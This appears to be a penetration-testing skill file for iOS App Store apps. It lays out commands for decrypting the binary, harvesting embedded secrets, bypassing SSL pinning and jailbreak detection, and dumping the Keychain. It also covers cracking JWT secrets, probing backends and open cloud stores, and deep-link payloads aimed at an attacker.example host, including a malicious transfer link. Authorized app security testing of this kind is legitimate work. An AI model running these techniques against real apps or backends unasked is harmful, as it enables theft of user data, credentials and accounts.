---
name: ios_app_store
description: iOS App Store app assessment — acquire the IPA, statically and dynamically analyze the binary, and exploit insecure storage, transport, IPC, and backend trust.
---

# iOS App Store App

An "iOS App Store" asset is a published app identified by its bundle id or App Store URL (e.g. `id1234567890`). The deliverable is a signed IPA plus the backend it talks to. The attacker's objective: pull the shipped binary, recover hardcoded secrets and endpoints, defeat client-side controls (jailbreak/SSL-pin/biometric gates), and reach the API and cloud backend the app implicitly trusts. The app is just the most authenticated, best-documented client of a server that is the real prize.

## Attack Surface

- **The IPA itself** — Mach-O binary, embedded `Info.plist`, provisioning profile, frameworks, and bundled assets (config plists, JSON, sqlite seeds, certs, JS bundles).
- **On-device storage** — `NSUserDefaults`, Keychain items, Core Data / sqlite, files in `Documents`/`Library`/`tmp`, plist caches, WebKit caches.
- **Transport** — REST/GraphQL/gRPC to backends; certificate pinning; ATS exceptions in `Info.plist`.
- **IPC & deep links** — custom URL schemes (`myapp://`), Universal Links (`apple-app-site-association`), `UIPasteboard`, app extensions, App Groups, `WKWebView` JS bridges.
- **Client-side trust** — jailbreak detection, SSL pinning, root/integrity checks, feature flags, and authorization decisions made in the app instead of the server.
- **Third-party SDKs** — analytics, ads, crash reporting, payment SDKs with their own keys, endpoints, and bugs.
- **Backend & cloud** — the API, plus Firebase/AWS/Azure buckets and keys the app embeds.

## Recon & Enumeration

Acquire the IPA first. From the public App Store listing, identify the bundle id / track id, then obtain the IPA via an authorized device backup, a corporate MDM export, or `ipatool` with your own Apple account:

```bash
# Resolve listing metadata (bundle id, version, seller) from the store id
curl -s "https://itunes.apple.com/lookup?id=1234567890" | jq '.results[] | {bundleId, version, sellerName, trackViewUrl}'

# Pull the IPA with your own authenticated Apple ID (authorized testing only)
go install github.com/majd/ipatool/v2@latest
ipatool auth login -e you@example.com
ipatool download -b com.target.app -o target.ipa
```

Unpack and triage the binary:

```bash
mkdir -p app && unzip -q target.ipa -d app
APP=$(ls -d app/Payload/*.app)
# Info.plist, schemes, ATS, entitlements
plutil -p "$APP/Info.plist" | less
codesign -d --entitlements :- "$APP" 2>/dev/null   # or: ldid -e "$APP/<binary>"
# Mach-O facts: arch, encryption flag, linked libs
otool -hv "$APP/$(plutil -extract CFBundleExecutable raw "$APP/Info.plist")"
otool -L "$APP/$(plutil -extract CFBundleExecutable raw "$APP/Info.plist")"
```

Static analysis tooling (Kali / pip):

```bash
pip install frida-tools objection            # dynamic instrumentation
# class-dump / nm / strings for ObjC; jtool2 or otool for Mach-O
nm -gU "$APP/<binary>" | head; strings -a "$APP/<binary>" | sort -u > strings.txt
# Full automated scan
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf  # MobSF: upload IPA in UI
```

Hunt secrets and endpoints in the unpacked bundle:

```bash
trufflehog filesystem app/ --only-verified
gitleaks dir app/ -v
grep -RInE 'https?://[a-zA-Z0-9._/-]+' app/ | grep -viE 'apple|schema|w3.org' | sort -u
grep -RInE '(AKIA|AIza|sk_live|xox[bp]-|eyJ[A-Za-z0-9_-]{10,})' app/   # AWS/Google/Stripe/Slack/JWT
semgrep --config p/mobsf --config p/secrets app/ 2>/dev/null
```

Enumerate and probe the backend the app reveals:

```bash
# Build a host list from extracted URLs, then map exposure
sort -u hosts.txt | httpx -title -status-code -tech-detect -json -o httpx.json
subfinder -d api.target.com -silent | dnsx -silent | naabu -top-ports 1000 -silent
nuclei -l hosts.txt -as -s critical,high -rl 50 -c 20 -bs 20 -timeout 10 -retries 1 -j -o nuclei.jsonl
wafw00f https://api.target.com
# Firebase/cloud exposure pulled from the IPA's GoogleService-Info.plist or strings
trivy fs --scanners secret,misconfig app/
```

## Methodology

1. **Acquire & verify** — Confirm bundle id and version match the store listing. Decrypt the Mach-O if it is App Store-encrypted (`cryptid 1` in `otool -l`): run on a jailbroken device/sim with `frida-ios-dump` or `bagbak` to dump the in-memory decrypted binary; strings/class-dump are useless on the encrypted blob.
2. **Static recon** — Parse `Info.plist` for URL schemes, ATS exceptions, background modes; dump entitlements (App Groups, Keychain access groups, associated domains). Enumerate frameworks/SDKs and their versions.
3. **Secret & endpoint extraction** — trufflehog/gitleaks/semgrep across the bundle; class-dump the ObjC runtime; pull every host/path. Flag API keys, signing secrets, JWT signing material, Firebase configs, S3 buckets.
4. **Map backend** — httpx/nuclei/naabu the discovered hosts; identify auth scheme (OAuth/JWT/session) and whether authorization is enforced server-side.
5. **Dynamic setup** — Jailbroken device or arm64 simulator; `frida-server` running; `objection explore` attached to the bundle id.
6. **Defeat client controls** — Bypass jailbreak detection and SSL pinning so traffic flows through an intercepting proxy.
7. **Intercept & abuse traffic** — Route through Burp/mitmproxy; replay, tamper, and fuzz API calls; test IDOR, broken auth, mass assignment.
8. **Inspect runtime storage** — Read Keychain, NSUserDefaults, sqlite, and files after exercising auth/payment flows.
9. **Attack IPC** — Fuzz custom URL schemes and Universal Links; probe WKWebView bridges and pasteboard leakage.
10. **Chain to backend/cloud** — Turn extracted keys and weak server-side checks into account takeover, data access, or cloud-resource compromise. Report with PoCs.

## Key Weaknesses / Techniques

- **App Store binary encryption (FairPlay)** — `cryptid 1` means strings/class-dump see ciphertext. Dump decrypted:
  ```bash
  frida-ios-dump -u <device-ip> -P <pass> com.target.app   # outputs decrypted .ipa
  ```
- **Hardcoded secrets** — Backend API keys, HMAC signing keys, OAuth client secrets, third-party tokens baked into the binary or plists. Validate by using the key against its service (e.g. test an extracted Google Maps/Firebase key, or a Stripe `sk_live_` against `https://api.stripe.com`).
- **SSL pinning** — Strip it to read traffic. With objection: `objection -g com.target.app explore` then `ios sslpinning disable`. Or a Frida script (`frida -U -f com.target.app -l pinning-bypass.js`) hooking `SecTrustEvaluate`/`NSURLSession` delegates and AFNetworking/Alamofire validators.
- **Jailbreak detection** — Bypass with `objection`'s `ios jailbreak disable` or a Frida hook on `fileExistsAtPath`, `canOpenURL("cydia://")`, `fork`, and `stat` of `/Applications/Cydia.app`, `/bin/bash`, `/etc/apt`.
- **Insecure local storage** — Secrets/PII/tokens in `NSUserDefaults`, plaintext sqlite, or cache files instead of Keychain. From objection: `ios nsuserdefaults get`, `ios keychain dump`, `env`, then pull files via `ios cookies get` and `file download`.
- **Weak ATS** — `NSAllowsArbitraryLoads` or per-domain exceptions in `Info.plist` permit cleartext / weak TLS. Confirm with `plutil -p "$APP/Info.plist" | grep -A20 NSAppTransportSecurity`.
- **Deep link / URL scheme abuse** — Unvalidated parameters drive sensitive actions or load attacker URLs in a webview:
  ```bash
  frida -U com.target.app -e 'ObjC...'   # or trigger from a malicious page:
  # <a href="myapp://transfer?to=attacker&amount=1000">tap</a>
  xcrun simctl openurl booted 'myapp://webview?url=https://attacker.example/x'
  ```
- **Universal Link / AASA misconfig** — Overly broad `paths` in `apple-app-site-association` can let an attacker-controlled path hijack link handling. Fetch and review:
  ```bash
  curl -s https://target.com/.well-known/apple-app-site-association | jq .
  ```
- **WKWebView JS bridge** — Exposed native handlers callable from injected JS; combine with a deep link that loads attacker content to reach native functionality.
- **Broken server-side authz (IDOR/BOLA)** — The app trusts client-supplied ids. Replay intercepted requests swapping object ids / user ids:
  ```bash
  sqlmap -r request.txt --batch --level 2          # if a param is injectable
  jwt_tool eyJ... -X a                              # test alg:none / weak-key JWTs
  jwt_tool eyJ... -C -d wordlist.txt               # crack HS256 secret
  ```
- **Vulnerable bundled SDKs** — Outdated frameworks with known CVEs.
  ```bash
  syft "$APP" -o cyclonedx-json=sbom.json && grype sbom:sbom.json
  ```
- **Cloud exposure** — Open Firebase RTDB/Firestore or world-readable S3 from embedded config:
  ```bash
  curl -s "https://<project>.firebaseio.com/.json"        # 200 + data = open DB
  awscli s3 ls s3://<bucket-from-strings> --no-sign-request
  ```

## Validation

- **Decryption** — Re-run `otool -l` on the dumped binary; `cryptid 0` and readable class-dump output confirm a usable decrypted Mach-O.
- **Secrets** — A finding is real only when the key authenticates: show the live API call it authorizes (Stripe balance read with a test key, Firebase read, signed request accepted by the backend). A revoked/sandbox/expired key is not a finding.
- **Pinning/JB bypass** — Demonstrate full request/response captured in the proxy after the bypass, with the app still functioning.
- **Storage** — Show the exact file/Keychain item, the sensitive value, and the user action that wrote it (e.g. auth token in `NSUserDefaults` after login).
- **Deep link / IDOR** — Provide the concrete URL or HTTP request and the unauthorized state change or data returned, reproduced twice.
- **Cloud** — Capture the HTTP 200 + sample (redacted) record proving anonymous read/write; stop at minimal proof.

## False Positives

- **Decompiled "secrets" that are public** — App Store public keys, OAuth *client* ids (not secrets), Firebase API keys (which are identifiers, not auth — exposure matters only if rules are open), and sandbox/test keys.
- **Pinning present but bypassable in lab only** — Defeating pinning on a jailbroken device proves nothing about remote attackers; the real issue is what the now-visible traffic reveals, not the bypass itself.
- **ATS exceptions for already-HTTPS hosts** — A `NSExceptionAllowsInsecureHTTPLoads:false` entry or an exception scoped to a domain you can't reach is not exploitable.
- **Strings from frameworks** — URLs/keys belonging to bundled SDKs (Apple, analytics) that the app never uses with privileged scope.
- **Keychain items with `WhenUnlockedThisDeviceOnly`/biometric ACL** — Proper storage; dumping it on a jailbroken device is expected, not a vuln.
- **Local-only "tampering"** — Modifying client state on your own device with no server-side effect (e.g. flipping a premium flag the backend re-validates).

## Chaining & Impact

- **Hardcoded backend key → server compromise** — An embedded admin/service key or HMAC secret lets you sign privileged API calls → mass data access or account takeover.
- **Pinning bypass → traffic analysis → IDOR/BOLA → bulk PII** — Reading the API exposes object-id patterns; iterating ids dumps other users' data.
- **JWT weakness → impersonation** — Extracted signing secret or `alg:none` acceptance forges arbitrary-user tokens → full account takeover across every client.
- **Open Firebase/S3 from IPA config → data breach or supply-chain** — World-readable DB leaks PII; world-writable bucket/DB lets you tamper with content served to all users.
- **Deep link + WKWebView bridge → on-device exploitation** — Malicious link loads attacker JS that calls native handlers → token theft or unauthorized in-app actions from a single tap.
- **Vulnerable SDK CVE → memory corruption / RCE** in the parsing path it handles.

## Pro Tips

1. The IPA is reconnaissance, not the target — the fastest path to impact is almost always the backend the app authenticates to. Spend the binary effort on endpoints, auth flows, and secrets.
2. Always check `cryptid` before trusting any static result; App Store binaries are encrypted and strings/class-dump on them are garbage. Dump decrypted first.
3. Firebase API keys are not secrets — exposure only matters if database/storage *rules* are permissive. Test the rules, not the key.
4. `objection` gets you 80% there with zero scripting (`ios sslpinning disable`, `ios jailbreak disable`, `ios keychain dump`, `ios nsuserdefaults get`); reach for custom Frida only when hooks are non-standard.
5. Exercise the app *through* the proxy before dumping storage — tokens, PII, and cache files appear only after real auth/payment flows run.
6. Diff `Info.plist` URL schemes and the AASA file together: a custom scheme + a broad Universal Link path is a classic link-hijack chain.
7. Enumerate App Groups and Keychain access groups in entitlements — shared containers between the app and its extensions are a common over-sharing of secrets.
8. Old app versions leak too: prior IPA builds (from device backups or archives) often still contain rotated-but-still-live keys and removed-but-still-deployed endpoints.
9. Decompile to find *signing* logic, not just keys — replicating the request-signing algorithm lets you fuzz the API even when pinning and integrity checks are intact.
